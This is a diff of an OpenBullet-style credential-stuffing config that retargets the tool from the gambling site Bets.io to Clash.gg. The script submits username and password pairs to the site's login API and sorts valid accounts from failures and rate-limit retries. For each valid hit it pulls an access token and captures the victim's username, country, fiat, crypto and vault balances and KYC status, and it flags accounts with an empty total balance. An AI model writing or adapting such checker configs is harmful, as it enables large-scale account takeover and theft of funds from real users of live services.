@@ -1,6 +1,6 @@
 [SETTINGS]
 {
-  "Name": "Bets.io",
+  "Name": "Clash.gg",
   "SuggestedBots": 100,
   "MaxCPM": 0,
   "LastModified": "2024-08-01T03:33:33.3333333-07:00",
@@ -40,7 +40,7 @@
   "CustomUserAgent": "",
   "RandomUA": false,
   "CustomCMDArgs": "",
-  "Title": "BETS",
+  "Title": "Clash.gg",
   "IconPath": "Icon\\svbfile.ico",
   "LicenseSource": null,
   "Message": null,
@@ -62,47 +62,53 @@
 }
 
 [SCRIPT]
-#SHA256 FUNCTION Hash SHA256 "<PASS>" -> VAR "SHA" 
-
-#users/sign_in REQUEST POST "https://api.bets.io/api/users/sign_in" ReadResponseSource=FALSE 
-  CONTENT "{\"user\":{\"email\":\"<USER>\",\"password\":\"<SHA>\"}}" 
+#/auth/login REQUEST POST "https://clash.gg/api/auth/login" ReadResponseSource=FALSE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
   CONTENTTYPE "application/json" 
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: application/json" 
 
-#Valid? KEYCHECK 
+#200_OK? KEYCHECK 
   KEYCHAIN Failure OR 
-    KEY "<RESPONSECODE>" EqualTo "422" 
+    KEY "<RESPONSECODE>" EqualTo "400" 
   KEYCHAIN Success OR 
-    KEY "<COOKIES(_casino_session)>" Contains "eyJ" 
+    KEY "<RESPONSECODE>" EqualTo "201" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
 
-#api/player REQUEST GET "https://api.bets2.io/api/player" 
+#/access-token REQUEST GET "https://clash.gg/api/auth/access-token" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: */*" 
+  HEADER "X-Made-With: fetch" 
 
-#2FA PARSE "<SOURCE>" LR "\"two_factor_enabled\":" "," -> VAR "2FA" 
+#accessToken PARSE "<SOURCE>" JSON "accessToken" -> VAR "A" 
 
-#Country PARSE "<SOURCE>" LR "\"country\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
-
-#player/accounts REQUEST GET "https://api.bets2.io/api/player/accounts?compatibility=false" 
+#/user/me REQUEST GET "https://clash.gg/api/user/me" 
   
   HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
   HEADER "Pragma: no-cache" 
-  HEADER "Accept: application/vnd.softswiss.v1+json" 
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Bearer <A>" 
 
-#Cashout PARSE "<SOURCE>" LR "available_to_cashout_cents\":" "," Recursive=TRUE -> VAR "Cashout" 
+#name PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Username" 
+
+#countryCode PARSE "<SOURCE>" JSON "countryCode" CreateEmpty=FALSE -> CAP "Country" 
+
+#balance PARSE "<SOURCE>" JSON "balance" CreateEmpty=FALSE -> CAP "Balance" 
+
+#balanceFiat PARSE "<SOURCE>" JSON "balanceFiat" CreateEmpty=FALSE -> CAP "Fiat" 
+
+#balanceCrypto PARSE "<SOURCE>" JSON "balanceCrypto" CreateEmpty=FALSE -> CAP "Crypto" 
+
+#balanceVault PARSE "<SOURCE>" JSON "balanceVault" CreateEmpty=FALSE -> CAP "Vault" 
+
+#kycStatus PARSE "<SOURCE>" JSON "kycStatus" CreateEmpty=FALSE -> CAP "KYC" 
+
+#TotalBalance FUNCTION Compute "<Balance>+<Fiat>+<Crypto>+<Vault>" -> VAR "TB" 
 
 #$? KEYCHECK BanOnToCheck=FALSE 
   KEYCHAIN Custom "CUSTOM" OR 
-    KEY "<2FA>" EqualTo "true" 
-    KEY "<Cashout>" EqualTo "[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]" 
-
-!#AmountCents PARSE "<SOURCE>" LR "\"amount_cents\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "AmountCents" 
-
-#Cashout PARSE "<SOURCE>" LR "available_to_cashout_cents\":" "," Recursive=TRUE CreateEmpty=FALSE -> CAP "Cashout" 
-
-!#WagerStatus PARSE "<SOURCE>" LR "wager_status\":\"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "WagerStatus" 
-
+    KEY "<TB>" EqualTo "0" 
